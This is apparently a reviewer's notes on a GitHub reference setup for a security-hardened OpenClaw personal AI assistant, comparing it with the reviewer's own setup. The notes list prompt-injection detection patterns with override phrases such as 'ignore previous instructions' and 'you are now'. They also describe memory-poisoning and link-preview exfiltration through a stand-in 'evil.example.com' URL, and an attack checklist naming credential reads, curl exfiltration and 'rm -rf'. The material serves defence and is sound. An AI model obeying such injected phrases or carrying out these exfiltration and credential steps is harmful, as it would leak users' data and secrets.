# openclaw-reference-setup (Atlas-Cowork/openclaw-reference-setup)

*Review #284 | Source: https://github.com/Atlas-Cowork/openclaw-reference-setup | License: MIT | Author: Atlas-Cowork | Reviewed: 2026-03-28 | Stars: 26*

## Rating: 🔥🔥🔥🔥

---

## What It Is

A reference architecture for a production-grade, security-hardened OpenClaw personal assistant setup. Not a plug-and-play installer — it's documentation, templates, and scripts from a setup that's been running 24/7 for months. No personal data, no credentials. Pure patterns.

Created 2026-03-25 (three days ago), updated today. Very fresh but clearly well-considered — there's a 67-source security literature review backing the threat model.

**Directly relevant:** This is a mirror of our own setup. Several of their design decisions align with what we're running, and a few are worth comparing notes.

---

## Core Architecture

```
Phone / Desktop (Telegram DM)
        │ TLS
        ▼
OpenClaw Gateway (loopback :18789)
        │
    ┌───┴─────────────────┐
    │ Agent + Sandbox      │
    │ Exec Approvals       │
    │ Tool Ecosystem       │
    └───┬─────────────────┘
        │
    ┌───┴─────────────────────────────────┐
    │ Memory Layer       │ Cron/LaunchD    │
    │ SOUL/USER/MEMORY   │ 12 scheduled    │
    │ daily/*.md         │ jobs            │
    └───┬─────────────────────────────────┘
        │
    Security Layer
    (Egress · File Integrity · Injection Detection)
```

**Stack choices:**
- Mac Mini M4 24GB dedicated (dedicated machine = separate attack surface, uptime, user isolation)
- Telegram as primary channel (rich media, mature Bot API, DM-only to reduce injection surface)
- Ollama local models (Qwen 27B) as Tier 3 fallback for privacy-sensitive tasks
- `launchd` for scheduling (not cron — more reliable, native macOS)
- iCloud Drive as phone↔agent file bridge (inbox/outbox via rsync + `brctl download` for lazy-fetched files)

---

## What's Good

### Dual-User Isolation

Agent runs as a dedicated OS user (UID 502), no sudo. Admin user (UID 501) manages the machine. This is the right architecture — blast radius if agent is compromised is contained to the agent's UID, not the whole machine. Not obvious to most people setting up their first AI assistant.

The insight:
```
Admin (UID 501): installs software, manages LaunchAgents, has Keychain
Agent (UID 502): owns workspace, runs gateway + tools, no sudo, sandboxed exec
```

### Security Score System (10-point self-assessment)

The cleanest part of the repo. A concrete scoring rubric:
1. User Isolation
2. Exec Control (allowlist + on-miss mode)
3. Egress Control (HTTP domain allowlist)
4. File Integrity (`uchg` + SHA256 checksums)
5. Credential Security (no creds in code/memory, chmod 600, rotation)
6. Injection Detection (pattern matching on external inputs)
7. Memory Validation (pre-write validation pipeline)
8. Prompt Protection (Unicode detection, link preview mitigation)
9. Audit & Monitoring (purple team schedule)
10. Supply Chain (skill review before install)

Their self-reported score: **7.5/10**. Gaps: file integrity watchdog not comprehensive, credential rotation not automated, audit schedule not fixed, supply chain not automated.

This rubric is worth adapting as a health check for our own setup.

### Memory Validation Pipeline

The pre-write check before anything goes into memory files is well thought out:

```
Source check (is it external? → paraphrase, don't copy)
  → Instruction check (does it contain instructions/URLs? → store only facts)
    → Injection pattern check ([System:], base64, etc. → block + alert)
      → Credential check (never write secrets to memory)
        → Source attribution (mark external facts)
          → Behavior check (would this change agent rules? → block)
            → ✅ Write
```

Memory poisoning is the subtle long-game attack: inject content into memory that changes behavior in future sessions. This pipeline catches it.

### Injection Detection Patterns

Explicit list of injection signatures to watch for in external inputs (email, web, files):
- `[System:]`, `[Override]`, `ignore (all )?previous instructions`
- `you are now`, `new instructions:`, `ADMIN:`
- Base64 strings >20 chars in external content
- Zero-width chars (U+200B, U+200C, U+200D), RTL override (U+202E)

Also: **link preview exfiltration** is called out explicitly as a CVE-class risk — Telegram auto-fetches URL previews, so an injected URL like `https://evil.example.com/collect?data=<sensitive>` exfiltrates data via preview fetch without the user seeing it. Mitigation: never auto-include external URLs from untrusted sources in chat responses.

### Anti-Loop Rules as Security Controls

Loops aren't just annoying — they're a security risk (token exhaustion, resource exhaustion, injection amplification). Hard rules:
- Same error twice → STOP, report to user
- 5 consecutive tool calls without user interaction → pause, explain
- Same action, same result → stop, report
- Any timeout → report, don't silently retry

### Cron Architecture (12 jobs)

Full catalog:
- Heartbeat (5 min)
- Gateway watchdog (5 min, auto-restart on crash)
- Briefing cache (daily 05:05 — pre-fetch weather/calendar/email summaries)
- Memory distillation (weekly)
- File integrity check (30 min)
- iCloud inbox/outbox sync (10 min each)
- Egress log rotation (daily)
- Docker cleanup (weekly)
- Backup (daily 03:00)
- Certificate check (weekly)
- Health report (weekly Monday)

**Guardian pattern** for cron scripts: each critical cron job starts by verifying its own SHA256 hash before executing. If the script has been tampered with, it exits. Prevents cron-based persistence attacks.

### Tool Stack Recommendations

Well-curated:
- TTS: Piper (local, near cloud-quality, 30+ languages, 100MB voice model)
- STT: faster-whisper (Whisper accuracy at 4x speed, large-v3 model, fully local)
- Email: Himalaya (notes authentication can be finicky, recommends Python smtplib for attachments)
- Scraping: Puppeteer + stealth plugin (only for JS-heavy sites; curl/jq for APIs)

### MITRE ATT&CK Mapping

Purple team audit checklist mapped to MITRE ATT&CK for AI assistants:
- Initial Access → prompt injection via email
- Execution → exec without approval
- Persistence → modify cron/LaunchAgent scripts
- Privilege Escalation → agent escalates to admin
- Defense Evasion → Unicode tricks in injections
- Credential Access → `security find-generic-password`
- Exfiltration → curl to attacker URL
- Impact → `rm -rf` without approval

---

## Comparison to Our Setup

**Aligned:**
- Same 3-layer memory architecture (SOUL/USER/MEMORY.md + daily files)
- Same loopback gateway approach
- Same exec approvals philosophy (allowlist + on-miss)
- Heartbeat monitoring pattern
- Local TTS (we have Voicebox/KittenTTS; they use Piper)

**Their approach we don't have:**
- Dedicated agent OS user (we run as zob) — this is the largest security gap in our setup
- `uchg` on SOUL.md and egress scripts
- SHA256 hash verification on cron scripts (guardian pattern)
- Memory pre-write validation pipeline (we have no formal injection check)
- Egress control wrapper (`safe_curl.sh`) — we allow unrestricted curl

**Our setup advantages:**
- LCM compaction handles context more sophisticatedly than their 200-line hard limit
- More mature tool ecosystem (bird, gog, himalaya, wacli, discrawl, etc.)
- Multi-agent with Anek/Debbie + NFS shared storage
- ClawdStrike security audit skill

**Quick wins from this:**
1. Add `chflags uchg` to SOUL.md, AGENTS.md, COMMON_SENSE.md (low effort, high protection)
2. Add injection pattern detection to heartbeat (scan recent external inputs)
3. Add memory pre-write validation to COMMON_SENSE.md as a rule
4. Implement the 10-point security score rubric against our own setup

---

## Limitations

- 26 stars, 3 days old — very new
- Reference only, not an installer — requires judgment to adapt
- Dual-user setup is genuinely useful but not documented step-by-step
- BENCHMARK.md (the 67-source security review) not reviewed — likely the most novel content
- Atlas-Cowork org is otherwise empty — unknown provenance/who is behind this

---

## Verdict

🔥🔥🔥🔥 — Best community-published OpenClaw security reference found so far. The security score rubric and memory validation pipeline are directly actionable. The dual-user isolation and guardian pattern for cron scripts are patterns we should adopt. Main value: it's a structured threat model for exactly our setup class, with concrete mitigations we can compare against.

MIT. Cloned to `~/src/openclaw-reference-setup`.
